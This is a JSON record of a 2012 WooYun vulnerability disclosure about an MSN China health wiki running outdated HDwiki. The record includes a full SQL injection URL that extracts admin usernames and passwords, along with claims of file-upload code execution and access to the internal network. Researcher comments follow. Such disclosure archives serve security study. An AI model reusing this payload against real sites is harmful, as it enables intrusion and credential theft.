{"id": 20613, "wybug_id": "wooyun-2012-06230", "wybug_title": "MSN某频道源码漏洞导致任意代码执行及内网渗透", "wybug_corp": "微软", "wybug_author": "路人甲", "wybug_date": "2012-04-20 15:04", "wybug_open_date": "2012-04-23 15:03", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "补丁不及时", "内网渗透"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-04-20：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-04-23：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 由于MSN某频道采用某开源源码，此源码存在较严重漏洞，而且打补丁不及时，导致任意代码执行，从而被成功入侵。 详细说明：  频道地址：http://wiki.health.msn.com.cn/些频道采用HDwiki源码，源码存在较多漏洞。如：HDwiki文件上传导致远程代码执行漏洞  WooYun: HDwiki文件上传导致远程代码执行漏洞 HDwiki某SQL注射和鸡肋文件包含 WooYun: HDwiki某SQL注射和鸡肋文件包含 HDWiki 5.1 任意用户密码修改漏洞  WooYun: HDWiki 5.1 任意用户密码修改漏洞 等。先是注入http://wiki.health.msn.com.cn/index.php?doc-summary-xxxxxxxxx%27%20and%201=2%20union%20select%201,2,3,4,5,concat%28username,0x7c,password%29,7,8,9,0,1,2,3,4,5,6,7,8,9,0%20from%20wiki_user%20where%20groupid=4%23结果如下图。不过还有更给力的，可以直接上传，即利用第一个漏洞。具体不说了，看图。。还是内网，可以继续渗透。。。   漏洞证明：  \n\n\n\n\n\n   修复方案：  你们比我更懂!   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：11 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2012-04-20 16:36 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  这个牛B了~mark    \n     2012-04-20 18:09 |    \t\tErrorera \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:21        | 我们应该在犯错误的情况下学习！)\t\t \n  难道是百科吗？ api接口是MSN通行证的 无从下手吧    \n     2012-04-21 03:44 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  微软的，得顶:^    \n     2012-04-21 18:29 |    \t\t小雨 \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:19        | phper)\t\t \n  orz,微软的...这个nb大发了,得关注    \n     2012-04-21 20:25 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  此贴必火    \n     2012-04-22 08:50 |    \t\t子墨 \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:22        | 天地不仁,以万物为刍狗;圣人不仁,以百姓为...)\t\t \n  关注...    \n     2012-04-23 22:20 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  HDWIKI引发的血案。。    \n     2012-04-24 09:41 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  @xsser 公开前，联系微软修复了？    \n     2012-04-24 10:34 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @一刀终情 对，不然不会公开的    \n     2012-04-24 12:00 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  额，为什么微软要用开源的这东西。。    \n     2012-04-24 12:35 |    \t\t小雨 \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:19        | phper)\t\t \n  @Passer_by 对啊。为啥用php，而不是用dotnet呢    \n     2012-04-24 13:59 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  @Passer_by 而且上线前，没审计是必然的……    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 11, "Ranks": null}